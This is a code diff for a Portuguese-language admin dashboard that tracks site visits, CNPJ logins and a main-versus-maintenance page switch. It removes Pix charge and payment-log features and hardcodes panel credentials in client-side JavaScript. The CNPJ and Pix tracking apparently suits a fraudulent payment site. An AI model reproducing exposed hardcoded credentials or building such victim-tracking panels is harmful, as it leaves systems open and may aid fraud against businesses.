@@ -501,7 +501,7 @@
             <h2 class="section-title">Entrar no dashboard</h2>
             <div class="field">
                 <label for="admin-username">Usuário</label>
-                <input id="admin-username" type="text" value="admin">
+                <input id="admin-username" type="text" value="macaco">
             </div>
             <div class="field">
                 <label for="admin-password">Senha</label>
@@ -541,14 +541,9 @@
                     <div class="metric-subtext">Formulários enviados</div>
                 </div>
                 <div class="metric-card">
-                    <div class="metric-label">Pix gerados</div>
-                    <div id="metric-pix" class="metric-value">0</div>
-                    <div class="metric-subtext">Checkouts abertos</div>
-                </div>
-                <div class="metric-card">
-                    <div class="metric-label">Pagamentos confirmados</div>
-                    <div id="metric-paid" class="metric-value">0</div>
-                    <div class="metric-subtext">Confirmações salvas</div>
+                    <div class="metric-label">Página ativa</div>
+                    <div id="metric-active-page" class="metric-value">Site</div>
+                    <div class="metric-subtext">Estado atual exibido para visitantes</div>
                 </div>
             </div>
 
@@ -557,7 +552,7 @@
                     <div class="chart-header">
                         <div>
                             <h3 class="section-title">Pulso de atividade</h3>
-                            <div class="chart-note">Um resumo visual do comportamento do site. As barras crescem conforme os acessos, cliques, logins, Pix e pagamentos aumentam.</div>
+                            <div class="chart-note">Um resumo visual do comportamento do site. As barras crescem conforme os acessos, visitantes, cliques e logins aumentam.</div>
                         </div>
                         <div class="trend-badges">
                             <div class="trend-badge blue" id="badge-top-metric">Mais forte: acessos</div>
@@ -586,14 +581,9 @@
                             <div class="chart-label">Logins</div>
                         </div>
                         <div class="chart-col">
-                            <div class="chart-track"><div id="bar-pix" class="chart-fill"></div></div>
-                            <div id="bar-value-pix" class="chart-value">0</div>
-                            <div class="chart-label">Pix</div>
-                        </div>
-                        <div class="chart-col">
-                            <div class="chart-track"><div id="bar-paid" class="chart-fill alt"></div></div>
-                            <div id="bar-value-paid" class="chart-value">0</div>
-                            <div class="chart-label">Pagos</div>
+                            <div class="chart-track"><div id="bar-page" class="chart-fill"></div></div>
+                            <div id="bar-value-page" class="chart-value">1</div>
+                            <div class="chart-label">Status</div>
                         </div>
                     </div>
                 </div>
@@ -601,11 +591,6 @@
                 <div class="panel-card">
                     <h3 class="section-title">Leitura rápida</h3>
                     <div class="mini-stats">
-                        <div class="mini-stat">
-                            Conversão em pagamento
-                            <strong id="mini-conversion">0%</strong>
-                            <span class="muted">Pagamentos confirmados sobre Pix gerados.</span>
-                        </div>
                         <div class="mini-stat">
                             Engajamento de clique
                             <strong id="mini-engagement">0</strong>
@@ -661,19 +646,7 @@
 
             <div class="settings-grid">
                 <div class="panel-card">
-                    <h3 class="section-title">Configurações gerais</h3>
-                    <div class="field">
-                        <label for="settings-admin-user">Usuário do painel</label>
-                        <input id="settings-admin-user" type="text">
-                    </div>
-                    <div class="field">
-                        <label for="settings-admin-pass">Senha do painel</label>
-                        <input id="settings-admin-pass" type="text">
-                    </div>
-                    <div class="field">
-                        <label for="settings-pix-email">Chave Pix ou e-mail</label>
-                        <input id="settings-pix-email" type="text">
-                    </div>
+                    <h3 class="section-title">Mensagem da manutenção</h3>
                     <div class="field">
                         <label for="settings-secondary-title">Título da segunda página</label>
                         <input id="settings-secondary-title" type="text">
@@ -691,20 +664,13 @@
                         <div class="muted">Nenhum acesso registrado ainda.</div>
                     </div>
                 </div>
-
-                <div class="panel-card">
-                    <h3 class="section-title">Histórico de pagamentos</h3>
-                    <div id="payments-log-list" class="list">
-                        <div class="muted">Nenhum pagamento registrado ainda.</div>
-                    </div>
-                </div>
             </div>
         </section>
     </div>
 
     <script>
         const API_STATE_ENDPOINT = "/api/state";
-        const DEFAULT_ADMIN = { username: "admin", password: "admin123" };
+        const DEFAULT_ADMIN = { username: "macaco", password: "macaquinhoronald" };
         const DEFAULT_ANALYTICS_STATE = {
             visits: 0,
             uniqueVisitors: 0,
@@ -822,15 +788,14 @@
             }, 2600);
         }
 
-        function pulseButton(button, callback) {
+        async function pulseButton(button, callback) {
             button.classList.add("loading");
-            setTimeout(() => {
-                try {
-                    callback();
-                } finally {
-                    button.classList.remove("loading");
-                }
-            }, 520);
+            await new Promise((resolve) => setTimeout(resolve, 520));
+            try {
+                await callback();
+            } finally {
+                button.classList.remove("loading");
+            }
         }
 
         function labelDate(dateValue) {
@@ -860,25 +825,28 @@
                 { key: "uniqueVisitors", label: "únicos", element: "bar-unique", value: "bar-value-unique" },
                 { key: "totalClicks", label: "cliques", element: "bar-clicks", value: "bar-value-clicks" },
                 { key: "cnpjLogins", label: "logins", element: "bar-logins", value: "bar-value-logins" },
-                { key: "pixGenerated", label: "pix", element: "bar-pix", value: "bar-value-pix" },
-                { key: "paymentsConfirmed", label: "pagamentos", element: "bar-paid", value: "bar-value-paid" }
+                { key: "activePageMetric", label: "status", element: "bar-page", value: "bar-value-page" }
             ];
 
-            const maxValue = Math.max(1, ...metrics.map((item) => state[item.key] || 0));
-            const strongest = metrics.reduce((best, item) => (state[item.key] > (state[best.key] || 0) ? item : best), metrics[0]);
+            const stateForChart = Object.assign({}, state, {
+                activePageMetric: state.activePage === "primary" ? 1 : 2
+            });
+
+            const maxValue = Math.max(1, ...metrics.map((item) => stateForChart[item.key] || 0));
+            const strongest = metrics.reduce((best, item) => (stateForChart[item.key] > (stateForChart[best.key] || 0) ? item : best), metrics[0]);
 
             metrics.forEach((item) => {
-                const rawValue = state[item.key] || 0;
+                const rawValue = stateForChart[item.key] || 0;
                 const height = Math.max(8, Math.round((rawValue / maxValue) * 100));
                 document.getElementById(item.element).style.setProperty("--bar-height", `${height}%`);
-                document.getElementById(item.value).textContent = rawValue;
+                document.getElementById(item.value).textContent = item.key === "activePageMetric"
+                    ? (state.activePage === "primary" ? "Site" : "Manutenção")
+                    : rawValue;
             });
 
             document.getElementById("badge-top-metric").textContent = `Mais forte: ${strongest.label}`;
             document.getElementById("badge-live-status").textContent = state.activePage === "primary" ? "Operação normal" : "Modo manutenção";
 
-            const conversion = state.pixGenerated > 0 ? Math.round((state.paymentsConfirmed / state.pixGenerated) * 100) : 0;
-            document.getElementById("mini-conversion").textContent = `${conversion}%`;
             document.getElementById("mini-engagement").textContent = state.totalClicks;
             document.getElementById("mini-uptime").textContent = state.activePage === "primary" ? "Operação normal" : "Em manutenção";
         }
@@ -891,16 +859,12 @@
             document.getElementById("metric-unique").textContent = state.uniqueVisitors;
             document.getElementById("metric-clicks").textContent = state.totalClicks;
             document.getElementById("metric-logins").textContent = state.cnpjLogins;
-            document.getElementById("metric-pix").textContent = state.pixGenerated;
-            document.getElementById("metric-paid").textContent = state.paymentsConfirmed;
+            document.getElementById("metric-active-page").textContent = state.activePage === "primary" ? "Site" : "Manutenção";
             document.getElementById("last-visit-text").textContent = labelDate(state.lastVisitAt);
             document.getElementById("last-payment-text").textContent = labelDate(state.lastPaymentAt);
             document.getElementById("active-page-text").textContent = state.activePage === "primary" ? "Principal" : "Segunda página";
             document.getElementById("status-mode-text").textContent = state.activePage === "primary" ? "Operação normal" : "Em manutenção";
             document.getElementById("status-screen-text").textContent = state.activePage === "primary" ? "Página principal" : "Tela de manutenção";
-            document.getElementById("settings-admin-user").value = credentials.username;
-            document.getElementById("settings-admin-pass").value = credentials.password;
-            document.getElementById("settings-pix-email").value = state.pixKey;
             document.getElementById("settings-secondary-title").value = state.secondaryTitle;
             document.getElementById("settings-secondary-message").value = state.secondaryMessage;
 
@@ -910,24 +874,6 @@
 
             renderList("access-log-list", state.accessLog, "Nenhum acesso registrado ainda.", (item) => {
                 return `<span>${labelDate(item.time)}</span><strong>${item.page === "primary" ? "Principal" : "Secundária"}</strong>`;
-            });
-
-            renderList("payments-log-list", state.payments, "Nenhum pagamento registrado ainda.", (item) => {
-                return `
-                    <div class="payment-item">
-                        <div class="payment-item-main">
-                            <div>
-                                <div class="payment-item-title">${item.companyName || "Razao social nao informada"}</div>
-                                <div class="muted">${item.label}</div>
-                            </div>
-                            <strong>${item.status} • ${item.amount}</strong>
-                        </div>
-                        <div class="payment-item-meta">
-                            CNPJ: ${item.cnpj || "Nao informado"}<br>
-                            QR gerado em: ${labelDate(item.time)}
-                        </div>
-                    </div>
-                `;
             });
 
             updateActivityChart(state);
@@ -952,25 +898,24 @@
             }
         }
 
-        function saveSettings() {
+        async function saveSettings() {
             const state = getAnalyticsState();
-            const username = document.getElementById("settings-admin-user").value.trim() || DEFAULT_ADMIN.username;
-            const password = document.getElementById("settings-admin-pass").value.trim() || DEFAULT_ADMIN.password;
-
-            state.pixKey = document.getElementById("settings-pix-email").value.trim() || state.pixKey;
             state.secondaryTitle = document.getElementById("settings-secondary-title").value.trim() || state.secondaryTitle;
             state.secondaryMessage = document.getElementById("settings-secondary-message").value.trim() || state.secondaryMessage;
 
-            saveAdminCredentials(username, password);
             saveAnalyticsState(state);
+            await persistAppStateNow();
+            await fetchRemoteAppState();
             refreshDashboard();
             showToast("success", "Configurações salvas", "As alterações do painel foram aplicadas com sucesso.");
         }
 
-        function setActivePage(pageName) {
+        async function setActivePage(pageName) {
             const state = getAnalyticsState();
             state.activePage = pageName;
             saveAnalyticsState(state);
+            await persistAppStateNow();
+            await fetchRemoteAppState();
             refreshDashboard();
             showToast(
                 "info",
@@ -996,10 +941,14 @@
             pulseButton(this, saveSettings);
         });
         document.getElementById("btn-activate-primary").addEventListener("click", function() {
-            pulseButton(this, () => setActivePage("primary"));
+            pulseButton(this, async () => {
+                await setActivePage("primary");
+            });
         });
         document.getElementById("btn-activate-secondary").addEventListener("click", function() {
-            pulseButton(this, () => setActivePage("secondary"));
+            pulseButton(this, async () => {
+                await setActivePage("secondary");
+            });
         });
 
         async function initializePanel() {
